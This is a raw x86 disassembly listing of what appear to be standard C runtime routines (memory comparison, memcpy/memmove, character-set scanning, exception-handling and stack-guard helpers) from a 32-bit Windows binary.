  428162:	mov    cl,BYTE PTR [esi]
  428164:	cmp    cl,BYTE PTR [edi]
  428166:	jne    0x4281c0
  428168:	add    esi,0x1
  42816b:	add    edi,0x1
  42816e:	sub    eax,0x1
  428171:	je     0x428190
  428173:	mov    cl,BYTE PTR [esi]
  428175:	mov    dl,BYTE PTR [edi]
  428177:	cmp    cl,dl
  428179:	jne    0x4281c0
  42817b:	mov    cl,BYTE PTR [esi+0x1]
  42817e:	mov    dl,BYTE PTR [edi+0x1]
  428181:	cmp    cl,dl
  428183:	jne    0x4281c0
  428185:	add    edi,0x2
  428188:	add    esi,0x2
  42818b:	sub    eax,0x2
  42818e:	jne    0x428173
  428190:	pop    edi
  428191:	pop    esi
  428192:	ret    
  428193:	mov    ecx,eax
  428195:	and    eax,0x3
  428198:	shr    ecx,0x2
  42819b:	je     0x4281c8
  42819d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42819f:	je     0x4281c8
  4281a1:	mov    ecx,DWORD PTR [esi-0x4]
  4281a4:	mov    edx,DWORD PTR [edi-0x4]
  4281a7:	cmp    cl,dl
  4281a9:	jne    0x4281bb
  4281ab:	cmp    ch,dh
  4281ad:	jne    0x4281bb
  4281af:	shr    ecx,0x10
  4281b2:	shr    edx,0x10
  4281b5:	cmp    cl,dl
  4281b7:	jne    0x4281bb
  4281b9:	cmp    ch,dh
  4281bb:	mov    eax,0x0
  4281c0:	sbb    eax,eax
  4281c2:	pop    edi
  4281c3:	sbb    eax,0xffffffff
  4281c6:	pop    esi
  4281c7:	ret    
  4281c8:	test   eax,eax
  4281ca:	je     0x428190
  4281cc:	mov    edx,DWORD PTR [esi]
  4281ce:	mov    ecx,DWORD PTR [edi]
  4281d0:	cmp    dl,cl
  4281d2:	jne    0x4281bb
  4281d4:	sub    eax,0x1
  4281d7:	je     0x4281f5
  4281d9:	cmp    dh,ch
  4281db:	jne    0x4281bb
  4281dd:	sub    eax,0x1
  4281e0:	je     0x4281f5
  4281e2:	and    ecx,0xff0000
  4281e8:	and    edx,0xff0000
  4281ee:	cmp    edx,ecx
  4281f0:	jne    0x4281bb
  4281f2:	sub    eax,0x1
  4281f5:	pop    edi
  4281f6:	pop    esi
  4281f7:	ret    
  4281f8:	int3   
  4281f9:	int3   
  4281fa:	int3   
  4281fb:	int3   
  4281fc:	int3   
  4281fd:	int3   
  4281fe:	int3   
  4281ff:	int3   
  428200:	push   ebp
  428201:	mov    ebp,esp
  428203:	push   edi
  428204:	push   esi
  428205:	push   ebx
  428206:	mov    ecx,DWORD PTR [ebp+0x10]
  428209:	jecxz  0x428232
  42820b:	mov    ebx,ecx
  42820d:	mov    edi,DWORD PTR [ebp+0x8]
  428210:	mov    esi,edi
  428212:	xor    eax,eax
  428214:	repnz scas al,BYTE PTR es:[edi]
  428216:	neg    ecx
  428218:	add    ecx,ebx
  42821a:	mov    edi,esi
  42821c:	mov    esi,DWORD PTR [ebp+0xc]
  42821f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428221:	mov    al,BYTE PTR [esi-0x1]
  428224:	xor    ecx,ecx
  428226:	cmp    al,BYTE PTR [edi-0x1]
  428229:	ja     0x428230
  42822b:	je     0x428232
  42822d:	sub    ecx,0x2
  428230:	not    ecx
  428232:	mov    eax,ecx
  428234:	pop    ebx
  428235:	pop    esi
  428236:	pop    edi
  428237:	leave  
  428238:	ret    
  428239:	int3   
  42823a:	int3   
  42823b:	int3   
  42823c:	int3   
  42823d:	int3   
  42823e:	int3   
  42823f:	int3   
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   esi
  428244:	xor    eax,eax
  428246:	push   eax
  428247:	push   eax
  428248:	push   eax
  428249:	push   eax
  42824a:	push   eax
  42824b:	push   eax
  42824c:	push   eax
  42824d:	push   eax
  42824e:	mov    edx,DWORD PTR [ebp+0xc]
  428251:	lea    ecx,[ecx+0x0]
  428254:	mov    al,BYTE PTR [edx]
  428256:	or     al,al
  428258:	je     0x428263
  42825a:	add    edx,0x1
  42825d:	bts    DWORD PTR [esp],eax
  428261:	jmp    0x428254
  428263:	mov    esi,DWORD PTR [ebp+0x8]
  428266:	mov    edi,edi
  428268:	mov    al,BYTE PTR [esi]
  42826a:	or     al,al
  42826c:	je     0x42827a
  42826e:	add    esi,0x1
  428271:	bt     DWORD PTR [esp],eax
  428275:	jae    0x428268
  428277:	lea    eax,[esi-0x1]
  42827a:	add    esp,0x20
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ebx
  428284:	push   esi
  428285:	push   edi
  428286:	push   ebp
  428287:	push   0x0
  428289:	push   0x0
  42828b:	push   0x428298
  428290:	push   DWORD PTR [ebp+0x8]
  428293:	call   0x428d0e
  428298:	pop    ebp
  428299:	pop    edi
  42829a:	pop    esi
  42829b:	pop    ebx
  42829c:	mov    esp,ebp
  42829e:	pop    ebp
  42829f:	ret    
  4282a0:	mov    ecx,DWORD PTR [esp+0x4]
  4282a4:	test   DWORD PTR [ecx+0x4],0x6
  4282ab:	mov    eax,0x1
  4282b0:	je     0x4282c1
  4282b2:	mov    eax,DWORD PTR [esp+0x8]
  4282b6:	mov    edx,DWORD PTR [esp+0x10]
  4282ba:	mov    DWORD PTR [edx],eax
  4282bc:	mov    eax,0x3
  4282c1:	ret    
  4282c2:	push   ebx
  4282c3:	push   esi
  4282c4:	push   edi
  4282c5:	mov    eax,DWORD PTR [esp+0x10]
  4282c9:	push   eax
  4282ca:	push   0xfffffffe
  4282cc:	push   0x4282a0
  4282d1:	push   DWORD PTR fs:0x0
  4282d8:	mov    DWORD PTR fs:0x0,esp
  4282df:	mov    eax,DWORD PTR [esp+0x20]
  4282e3:	mov    ebx,DWORD PTR [eax+0x8]
  4282e6:	mov    esi,DWORD PTR [eax+0xc]
  4282e9:	cmp    esi,0xffffffff
  4282ec:	je     0x42831c
  4282ee:	cmp    esi,DWORD PTR [esp+0x24]
  4282f2:	je     0x42831c
  4282f4:	lea    esi,[esi+esi*2]
  4282f7:	mov    ecx,DWORD PTR [ebx+esi*4]
  4282fa:	mov    DWORD PTR [esp+0x8],ecx
  4282fe:	mov    DWORD PTR [eax+0xc],ecx
  428301:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428306:	jne    0x42831a
  428308:	push   0x101
  42830d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428311:	call   0x428356
  428316:	call   DWORD PTR [ebx+esi*4+0x8]
  42831a:	jmp    0x4282df
  42831c:	pop    DWORD PTR fs:0x0
  428323:	add    esp,0xc
  428326:	pop    edi
  428327:	pop    esi
  428328:	pop    ebx
  428329:	ret    
  42832a:	xor    eax,eax
  42832c:	mov    ecx,DWORD PTR fs:0x0
  428333:	cmp    DWORD PTR [ecx+0x4],0x4282a0
  42833a:	jne    0x42834c
  42833c:	mov    edx,DWORD PTR [ecx+0xc]
  42833f:	mov    edx,DWORD PTR [edx+0xc]
  428342:	cmp    DWORD PTR [ecx+0x8],edx
  428345:	jne    0x42834c
  428347:	mov    eax,0x1
  42834c:	ret    
  42834d:	push   ebx
  42834e:	push   ecx
  42834f:	mov    ebx,0x46344c
  428354:	jmp    0x428360
  428356:	push   ebx
  428357:	push   ecx
  428358:	mov    ebx,0x46344c
  42835d:	mov    ecx,DWORD PTR [ebp+0x8]
  428360:	mov    DWORD PTR [ebx+0x8],ecx
  428363:	mov    DWORD PTR [ebx+0x4],eax
  428366:	mov    DWORD PTR [ebx+0xc],ebp
  428369:	pop    ecx
  42836a:	pop    ebx
  42836b:	ret    0x4
  42836e:	int3   
  42836f:	int3   
  428370:	push   ebp
  428371:	mov    ebp,esp
  428373:	push   edi
  428374:	push   esi
  428375:	mov    esi,DWORD PTR [ebp+0xc]
  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
